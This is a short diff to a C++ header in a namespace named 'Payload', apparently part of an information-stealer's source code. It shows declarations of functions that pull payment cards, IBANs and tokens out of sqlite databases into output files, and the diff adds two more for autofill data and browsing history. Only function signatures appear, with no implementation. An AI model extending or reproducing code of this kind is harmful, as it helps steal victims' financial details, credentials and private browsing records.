@@ -38,6 +38,10 @@ namespace Payload {
         void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
         void ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile);
         void ExtractTokens(sqlite3* db, const std::filesystem::path& outFile);
+        
+        // NEW: Autofill and History extraction methods
+        void ExtractAutofill(sqlite3* db, const std::filesystem::path& outFile);
+        void ExtractHistory(sqlite3* db, const std::filesystem::path& outFile);
 
         std::string EscapeJson(const std::string& s);
 
